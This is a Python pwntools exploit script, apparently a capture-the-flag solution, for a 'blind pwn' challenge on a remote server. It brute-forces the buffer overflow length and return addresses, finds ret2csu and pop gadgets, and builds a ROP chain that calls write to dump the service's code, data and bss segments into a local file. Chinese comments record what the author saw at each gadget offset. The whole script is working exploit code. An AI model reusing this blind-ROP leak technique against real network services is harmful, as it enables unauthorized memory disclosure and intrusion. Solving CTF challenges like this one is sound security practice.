#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"


def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('pwn.sixstars.team', 22041)
            sh.recvuntil("Welcome to this blind pwn!\n")
            sh.send(i * 'a')
            output = sh.recv()
            sh.close()
            if not output.startswith('Goodbye!\n'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1

overflow_len = 0x28 #getbufferflow_length()
print hex(overflow_len)

def detect_main(buff_len=0x2c):
    length = 0
    for i in range(8):
      for j in range(256):
        sh = remote('pwn.sixstars.team', 22041)
        sh.recvuntil("Welcome to this blind pwn!\n")
        sh.send(buff_len*'a' +p64(length)[:i]+ chr(j))
        try:
            sh.recvuntil("Welcome to this blind pwn!\n")
        except:
            sh.close()
        else:
            sh.close()
            length = length + j*(0x100**i)
            break
    return length

# this is not the true main address; actually in start
main_addr = 0x400576 #detect_main(overflow_len)
print hex(main_addr)


def detect_write(buff_len=0x2c):
    length = 0
    for i in range(4):
      for j in range(256):
        sh = remote('pwn.sixstars.team', 22041)
        sh.recvuntil("Welcome to this blind pwn!\n")
        sh.send(buff_len*'a' +p64(length)[:i]+ chr(j))
        try:
            sh.recvuntil("Goodbye!\n")
        except:
            sh.close()
        else:
            sh.close()
            length = length + j*(0x100**i)
            break
    return length

write_addr = 0x400705 #detect_write(overflow_len)
print hex(write_addr)


'''#检测泄露点
for j in range(0x10):
    print "============="
    print "write +%d"%(j)
    sh = remote('pwn.sixstars.team', 22041)
    sh.recvuntil("Welcome to this blind pwn!\n")
    sh.send(overflow_len*'a' +p64(write_addr+j))
    sh.recvall()
    sh.close()
'''
'''
观察输出:
1. write + 5时， 依然能够输出“Good│bye!”， 但长度变为0x100, 推测残留rdx为0x100, write到write+5是给rdx赋值。
2. write + 10 时，接收到输入的值， 说明write+5 - write+10给rsi 赋值, 则找到pop_rsi gadget, 就可以利用这个点来泄露。
3. write + 15 时，也可以接收0x100个，这里应该是call write函数
3.2
'''

def detect_csu(buff_len,start,detect_range):
    '''
    通过多个pop,检测ret2csu位置
    '''
    csu_pop = 0
    for i in range(detect_range):
        sh = remote('pwn.sixstars.team', 22041)
        sh.recvuntil("Welcome to this blind pwn!\n")
        sh.send(buff_len*'a' + p64(start+i)+p64(0)*7+p64(main_addr))
        try:
            sh.recvuntil("Welcome to this blind pwn!\n")
        except:
            sh.close()
        else:
            sh.close()
            csu_pop = start + i 
            break
    return csu_pop


csu_pop = 0x400776 #detect_csu(overflow_len, write_addr+0x50, 0x200)
print hex(csu_pop)

# 根据csu_pop，推测以下地址:
csu_loop = 0x400760 # 根据上一个推算出
pop_rdi_ret =  0x400783
pop_rsi_r15_ret = 0x400781

call_write = write_addr + 15

code_start =  0x400000
data_start =  0x600000
bss_start =   0x601000


def leak_elf(start, length):
    elf = ''
    for i in range((length+0xff)/0x100):
        sh=remote("pwn.sixstars.team",22041)
        sh.recvuntil("Welcome to this blind pwn!\n")
        f = {
            overflow_len:     p64(pop_rdi_ret),
            overflow_len+8:   p64(1),
            overflow_len+0x10:p64(pop_rsi_r15_ret),
            overflow_len+0x18:p64(start+i*0x100),
            overflow_len+0x20:p64(0),
            overflow_len+0x28:p64(call_write)
        }

        payload = fit(f, filler = 'a', length = 0x80)
        sh.sendline(payload)
        elf += sh.recv(0x100)
        sh.close()
    return elf

code_seg = leak_elf(code_start, 0x1000)
print code_seg
print len(code_seg)
data_seg = leak_elf(data_start, 0x100)
print len(data_seg)
bss_seg = leak_elf(bss_start, 0x100)
print len(bss_seg)



with open('elf_leak','w') as f:
    f.write(code_seg + data_seg + bss_seg)
    f.close()

# 泄露的文件可以用ida打开,即为这道题的elf文件。
